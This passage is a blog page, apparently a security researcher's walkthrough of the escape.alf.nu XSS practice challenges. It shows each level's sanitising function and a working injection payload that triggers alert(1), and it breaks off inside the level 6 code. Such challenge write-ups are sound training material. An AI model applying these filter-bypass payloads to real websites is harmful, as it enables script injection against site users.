@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Escape.alf.nu walkthrough</title>
+
+    <meta name="description" content="Web 300 - Java Serialization">
+
+    <!-- Google Authorship Markup -->
+    <link rel="author" href="https://plus.google.com/GokulKrishna33?rel=author">
+
+    <!-- Social Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gkgkrishna33">
+    <meta name="twitter:title" content="Escape.alf.nu walkthrough">
+    <meta name="twitter:description" content="Web 300 - Java Serialization">
+
+    
+    <meta property="twitter:image:src" content="http://localhost:4000">
+    
+
+    <!-- Social Facebook/Open Graph -->
+    <meta property="og:url" content="http://localhost:4000/Escape.alf.nu_Walkthrough/">
+    <meta property="og:title" content="Escape.alf.nu walkthrough">
+    
+    <meta property="og:image" content="http://localhost:4000">
+    
+    <meta property="og:description" content="Web 300 - Java Serialization">
+    <meta property="og:site_name" content="Gokul Krishna - Web Security Researcher">
+
+    <!-- Social Google+/Schema.org  -->
+    <meta itemprop="name" content="Escape.alf.nu walkthrough"/>
+    <meta itemprop="description" content="Web 300 - Java Serialization">
+    <meta itemprop="image" content="http://localhost:4000/assets/img/blog-image.png"/>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+    <!-- Apple Touch Icons -->
+    <link rel="apple-touch-icon" href="/assets/img/icons/apple-touch-icon.png" />
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/img/icons/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/img/icons/apple-touch-icon-72x72.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/img/icons/apple-touch-icon-114x114.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/img/icons/apple-touch-icon-144x144.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/img/icons/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/img/icons/apple-touch-icon-120x120.png" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/img/icons/apple-touch-icon-76x76.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/img/icons/apple-touch-icon-152x152.png" />
+
+    <!-- Windows 8 Tile Icons -->
+    <meta name="application-name" content="gkrishna Blog">
+    <meta name="msapplication-TileColor" content="#5d4d7a">
+    <meta name="msapplication-square70x70logo" content="smalltile.png" />
+    <meta name="msapplication-square150x150logo" content="mediumtile.png" />
+    <meta name="msapplication-wide310x150logo" content="widetile.png" />
+    <meta name="msapplication-square310x310logo" content="largetile.png" />
+
+    <!-- Android Lolipop Theme Color -->
+    <meta name="theme-color" content="#5d4d7a">
+
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="canonical" href="http://localhost:4000/Escape.alf.nu_Walkthrough/">
+    <link rel="alternate" type="application/rss+xml" title="Gokul Krishna - Web Security Researcher" href="http://localhost:4000/feed.xml" />
+</head>
+
+    <head>
+        <!-- Global Site Tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106744514-1"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments)};
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106744514-1');
+      </script>
+    </head>
+    <body>
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs><symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z"/></symbol><symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z"/></symbol><symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z"/></symbol><symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z"/></symbol><symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"/></symbol><symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z"/></symbol><symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z"/></symbol><symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z"/></symbol><symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z"/></symbol><symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#489472"/></symbol></defs></svg>
+
+        <header class="header-post">
+   	<p>λ</p>
+    <div class="search-wrapper">
+
+    <div class="search-form">
+        <input arial-label="Search for a post" type="text" class="search-field" placeholder="Search...">
+        <svg class="icon-remove-sign"><use xlink:href="#icon-close"></use></svg>
+
+        <ul class="search-results search-list"></ul>
+    </div>
+
+</div>
+
+<!-- Menu Open -> Fade effect -->
+<div id="fade" class="overlay"></div>
+<a id="slide" class="slideButton fade">
+    <svg id="open" class="icon-menu"><use xlink:href="#icon-menu"></use></svg>
+    <svg id="close" class="icon-menu"><use xlink:href="#icon-close"></use></svg>
+</a>
+
+<aside id="sidebar">
+  <div id="topmenu">
+    
+    <ul>
+      <li><span>1</span></li>
+      <li><span> /Escape.alf.nu_Walkthrough/</span></li>
+      <li><span>⌘ blogspace λ </span></li>
+      <li><span>* Menu</span></li>
+    </ul>
+
+    <ul>
+      <li><span>utf-8</span></li>
+      <li><span>web</span></li>
+      <li><span>.html</span></li>
+    </ul>
+  </div>
+
+  <nav id="navigation" role="navigation">
+    <ul>
+      
+      
+      
+        <li>
+          <span class="counter-menu">1</span>
+          <svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg>
+          <a href="http://localhost:4000/"> home</a>
+        </li>
+      
+
+         
+      
+      
+        <li>
+          <span class="counter-menu">2</span>
+          <svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg>
+          <a href="http://localhost:4000/posts"> my posts</a>
+        </li>
+      
+
+         
+      
+      
+        <li>
+          <span class="counter-menu">3</span>
+          <svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg>
+          <a href="http://localhost:4000/series"> series</a>
+        </li>
+      
+
+         
+      
+      
+        <li>
+          <span class="counter-menu">4</span>
+          <svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg>
+          <a href="http://localhost:4000/tags"> tags</a>
+        </li>
+      
+
+         
+      
+      
+        <li>
+          <span class="counter-menu">5</span>
+          <svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg>
+          <a href="http://localhost:4000/about"> about me</a>
+        </li>
+      
+
+         
+      
+    </ul>
+
+    <ul>
+      <li><span class="counter-menu">g</span><svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg><a title="Show my projects on GitHub"  target="_blank" href="http://github.com/gokulkrishna01" class="search">github</a></li>
+      <li><span class="counter-menu">s</span><svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg><a id="searching" title="Search for a post" class="search">search</a></li>
+      <li><span class="counter-menu">t</span><svg viewBox="0 0 50 50" class="icon-arrow-menu"><use xlink:href="#icon-right-arrow"></use></svg><a title="Follow me in Twitter" target="_blank" href="http://twitter.com/gkgkrishna33">twitter</a></li>
+    </ul>
+  </nav>
+</aside>
+
+<a id="search" class="dosearch">
+    <svg class="icon-menu icon-search"><use xlink:href="#icon-search"></use></svg>
+</a>
+
+</header>
+
+        <div class="tree-posts">
+
+    <h3>*Posts*</h3>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Contemplation/">
+                <h2 class="post-title" itemprop="name">A-quick-look-back.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Web_SimpleCMS_CodeGateQ/">
+                <h2 class="post-title" itemprop="name">Simple-CMS---CodeGatePreQuals---2018.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/SharifCTF_Web_Photoshare/">
+                <h2 class="post-title" itemprop="name">Session_id-manipulation---SharifCTF-2018.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Web_VulnShop_InsomniHack/">
+                <h2 class="post-title" itemprop="name">Remote-Code-Execution-via-Session---InsomniHack-Teaser-2018.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Web500_Secure_Auth/">
+                <h2 class="post-title" itemprop="name">InCTF-Web500-Secure-Auth.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Associating_Isolated_Browsing_Sessions/">
+                <h2 class="post-title" itemprop="name">One-Side-Channel-to-Bring-Them-All-and-in-the-Darkness-Bind-Them:-Associating-Isolated-Browsing-Sessions.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Web300_CSAW_Quals/">
+                <h2 class="post-title" itemprop="name">Java-Serialization-CSAW-Web-300.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Escape.alf.nu_Walkthrough/">
+                <h2 class="post-title" itemprop="name">Escape.alf.nu-walkthrough.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Admin1_Web100_XSS_SECT_CTF/">
+                <h2 class="post-title" itemprop="name">SECT-CTF-16-Admin1---Web-100-writeup.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/AssertFunction_CSAW16_Web125/">
+                <h2 class="post-title" itemprop="name">CSAW-CTF-16-Web-125-writeup.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+    <article role="article" class="post-item" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
+        <div class="content">
+            <a title="Open the post" href="/Bandit_Walkthrough/">
+                <h2 class="post-title" itemprop="name">Bandit-Walkthrough.md</h2>
+            </a>
+        </div>
+    </article>
+
+    
+
+</div>
+
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-5012699001635479"
+     data-ad-slot="9244142234"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+        <section class="post" itemscope itemtype="http://schema.org/BlogPosting">
+            
+                <div class="time">
+                    <time itemprop="datePublished" datetime="2017-01-23 00:06:31 +0000">23 Jan 2017</time>
+                </div>
+            
+            <h1 class="post-title" itemprop="name">Escape.alf.nu walkthrough</h1>
+
+            <article role="article" id="scroll" class="post-content" itemprop="articleBody">
+                <p>There are many solutions to Erling Ellingsen’s <a href="https://alf.nu/alert1">escape.alf.nu</a> XSS challenges and I will be giving the solutions to first few challenges in the set.
+I suggest <b>not to</b> read the write-up before you attempting it. It can take several days to solve the challenges depending on the amount of knowledge you’ve on the same. It took me several days to complete up till the first three challenges and I’d be posting here on how to tackle them effectively and also the key points to note upon while solving the challenges.</p>
+
+<p><code class="highlighter-rouge">Level 0</code>:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Warmup.</span>
+
+  <span class="k">return</span> <span class="s1">'console.log("'</span><span class="o">+</span><span class="nx">s</span><span class="o">+</span><span class="s1">'");'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Point to be noted to here is first we have to close the <code class="highlighter-rouge">console.log</code> and then fulfil with the requirement we want.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">");alert(1);//</code></p>
+
+<p><code class="highlighter-rouge">Level 1</code>:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Escaping scheme courtesy of Adobe Systems, Inc.</span>
+  <span class="nx">s</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/"/g</span><span class="p">,</span> <span class="s1">'</span><span class="err">\\</span><span class="s1">"'</span><span class="p">);</span>
+  <span class="k">return</span> <span class="s1">'console.log("'</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="s1">'");'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The key point in the next level is that the <code class="highlighter-rouge">s.replace(/""/g, '//"/');</code> replaces the <code class="highlighter-rouge">"</code> as <code class="highlighter-rouge">/"</code> for which we simply have to escape the backslash.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">\");alert(1);//</code></p>
+
+<p><code class="highlighter-rouge">Level 2</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">s</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+  <span class="k">return</span> <span class="s1">'console.log('</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="s1">');'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Pointed to be noted here is with the function <code class="highlighter-rouge">JSON.stringify(s);</code> which will escape double quotes <code class="highlighter-rouge">“</code> into <code class="highlighter-rouge">/”</code> but then we can see that it doesn’t escape <code class="highlighter-rouge">&lt;&gt;</code> brackets. So what suddenly struck me was to make a script block and then execute <code class="highlighter-rouge">alert(1)</code> in it.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">&lt;/script&gt;alert(1)</code></p>
+
+<p><code class="highlighter-rouge">Level 3</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">'javascript:console.log('</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">+</span> <span class="s1">')'</span><span class="p">;</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+
+  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span>
+  <span class="nx">a</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+  <span class="nx">a</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Point to be noted here is that <code class="highlighter-rouge">console.log(url)</code> which make us enable to use URL encoding for double quotes because it’s being escaped here.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">%22);alert(1);//</code></p>
+
+<p><code class="highlighter-rouge">Level 4</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">'&amp;quot;'</span><span class="p">);</span>
+  <span class="c1">// URLs</span>
+  <span class="nx">text</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">(</span><span class="sr">http:</span><span class="se">\/\/\S</span><span class="sr">+</span><span class="se">)</span><span class="sr">/g</span><span class="p">,</span> <span class="s1">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span><span class="p">);</span>
+  <span class="c1">// [[img123|Description]]</span>
+  <span class="nx">text</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\[\[(\w</span><span class="sr">+</span><span class="se">)\|(</span><span class="sr">.+</span><span class="se">?)\]\]</span><span class="sr">/g</span><span class="p">,</span> <span class="s1">'&lt;img alt="$2" src="$1.gif"&gt;'</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">text</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Point to be noted here is that <code class="highlighter-rouge">&lt;</code> is being globally replaced by <code class="highlighter-rouge">&amp;lt</code> and <code class="highlighter-rouge">“</code> is being replaced once by <code class="highlighter-rouge">&amp;quot</code> . Then I noticed how it is being replaced and then I split the whole thing up inside the <code class="highlighter-rouge">text.replace()</code> and then arrived at the solution. Moreover the escape function uses a template like <code class="highlighter-rouge">[[src|alt]]</code>.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">[[a|””onload=alert(1);//]]</code></p>
+
+<p>It will be rendered as:</p>
+
+<p><code class="highlighter-rouge">&lt;img src=”a.gif” onload=”alert(1)” alt”““&gt;</code></p>
+
+<p><code class="highlighter-rouge">Level 5</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Level 4 had a typo, thanks Alok.</span>
+  <span class="c1">// If your solution for 4 still works here, you can go back and get more points on level 4 now.</span>
+
+  <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/"/g</span><span class="p">,</span> <span class="s1">'&amp;quot;'</span><span class="p">);</span>
+  <span class="c1">// URLs</span>
+  <span class="nx">text</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">(</span><span class="sr">http:</span><span class="se">\/\/\S</span><span class="sr">+</span><span class="se">)</span><span class="sr">/g</span><span class="p">,</span> <span class="s1">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span><span class="p">);</span>
+  <span class="c1">// [[img123|Description]]</span>
+  <span class="nx">text</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\[\[(\w</span><span class="sr">+</span><span class="se">)\|(</span><span class="sr">.+</span><span class="se">?)\]\]</span><span class="sr">/g</span><span class="p">,</span> <span class="s1">'&lt;img alt="$2" src="$1.gif"&gt;'</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">text</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>There were two points to be noted. One was that in the comment part which made me realize that it had similarity to that of the previous question and even before reading the rest, I tried the previous payload which didn’t work. Later I went through the rest of the code and figured out that it was in an http context.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">[[a|http://onload=alert(1);//]]</code></p>
+
+<p><code class="highlighter-rouge">Level 6</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Slightly too lazy to make two input fields.</span>
+  <span class="c1">// Pass in something like "TextNode#foo"</span>
+  <span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="sr">/#/</span><span class="p">);</span>
+
+  <span class="c1">// Only slightly contrived at this point.</span>
+  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'div'</span><span class="p">);</span>
